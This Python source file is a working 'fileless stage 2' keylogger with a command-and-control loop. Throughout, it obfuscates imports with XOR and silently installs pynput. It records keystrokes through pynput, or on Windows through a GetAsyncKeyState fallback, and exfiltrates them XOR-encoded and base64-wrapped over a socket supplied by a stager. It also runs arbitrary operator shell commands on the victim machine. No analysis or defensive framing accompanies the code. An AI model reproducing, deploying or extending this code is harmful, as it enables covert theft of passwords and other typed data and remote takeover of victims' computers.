import subprocess
import os
import threading
import time
import sys

# Global buffer to store intercepted keystrokes
keystroke_buffer = ""
logging_active = True

def keylogger_thread():
    global keystroke_buffer, logging_active
    # XOR Helper for string obfuscation
    def _x(d, k="K3yl0g"):
        return "".join(chr(ord(c) ^ ord(k[i % len(k)])) for i, c in enumerate(d))

    try:
        # Attempt silent installation of pynput if it is missing
        try:
            import pynput
        except ImportError:
            getattr(__import__(_x('\x18\x06\x1b\x1c\x12\x08\x00\x04\x12\x10', "S3cr3t")), 'check_call')(
                [getattr(__import__(_x('\x10\x1a\x10', "S3cr3t")), 'executable'), "-m", "pip", "install", "pynput"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

        # Attempt to use pynput if available on the target system
        from pynput.keyboard import Listener
        
        def on_press(key):
            global keystroke_buffer
            try:
                keystroke_buffer += key.char
            except AttributeError:
                if key == key.space:
                    keystroke_buffer += " "
                elif key == key.enter:
                    keystroke_buffer += "\n"
                else:
                    keystroke_buffer += f"[{key}]"

        with Listener(on_press=on_press) as listener:
            while logging_active:
                time.sleep(1)
            listener.stop()
            
    except Exception:
        # Fallback for Windows using ctypes (Zero Dependencies Required)
        if os.name == 'nt':
            import ctypes
            user32 = ctypes.windll.user32
            while logging_active:
                for i in range(1, 256):
                    if user32.GetAsyncKeyState(i) & 1:
                        if i == 13:
                            keystroke_buffer += "\n"
                        elif i == 32:
                            keystroke_buffer += " "
                        else:
                            # Basic mapping for demonstration; advanced mapping requires virtual key code translation
                            keystroke_buffer += chr(i)
                time.sleep(0.01)
        else:
            keystroke_buffer = "[!] Keylogger requires the 'pynput' module on Linux/macOS. Run 'pip install pynput' on the target."

def run_c2():
    global client_socket, keystroke_buffer, logging_active

    def _send(data):
        import struct, base64
        if isinstance(data, str): data = data.encode('utf-8', errors='ignore')
        enc = base64.b64encode(bytes([b ^ ord(XOR_KEY[i % len(XOR_KEY)]) for i, b in enumerate(data)]))
        client_socket.sendall(struct.pack('>I', len(enc)) + enc)

    def _recv():
        import struct, base64
        def _r(n):
            d = bytearray()
            while len(d) < n:
                p = client_socket.recv(n - len(d))
                if not p: return None
                d.extend(p)
            return bytes(d)
        raw_l = _r(4)
        if not raw_l: return None
        l = struct.unpack('>I', raw_l)[0]
        if l == 0: return b"" # Heartbeat
        enc = _r(l)
        if not enc: return None
        dec = base64.b64decode(enc)
        return bytes([b ^ ord(XOR_KEY[i % len(XOR_KEY)]) for i, b in enumerate(dec)])

    # Start the stealthy keylogger in a background thread
    k_thread = threading.Thread(target=keylogger_thread, daemon=True)
    k_thread.start()

    _send(b"\n[+] Fileless Stage 2 Keylogger & C2 Initialized!\n[*] Type 'keydump' to view intercepted keystrokes.\n[*] Type 'keyclear' to wipe the log buffer.\n\n")
    
    while True:
        try:
            data = _recv()
            if data is None: break
            if data == b"": continue

            cmd = data.decode('utf-8', errors='ignore').strip()
            if not cmd: continue
            
            if cmd.lower() in ['exit', 'quit']:
                logging_active = False
                break
                
            # --- Custom Post-Exploitation Commands ---
            if cmd.lower() == 'keydump':
                if not keystroke_buffer:
                    _send(b"[!] Keystroke buffer is currently empty.\n")
                else:
                    output = f"\n--- Intercepted Keystrokes ---\n{keystroke_buffer}\n------------------------------\n"
                    _send(output)
                continue
                
            if cmd.lower() == 'keyclear':
                keystroke_buffer = ""
                _send(b"[+] Keystroke buffer cleared.\n")
                continue

            # --- Standard OS Command Execution ---
            if cmd.startswith('cd '):
                try: os.chdir(cmd[3:].strip())
                except Exception as e: _send(f"{e}\n")
                else: _send(b"\n")
                continue
            
            out = subprocess.getoutput(cmd)
            _send(out + "\n")
            
        except Exception as e:
            break
            
# Stager entry point
if 'client_socket' in globals():
    run_c2()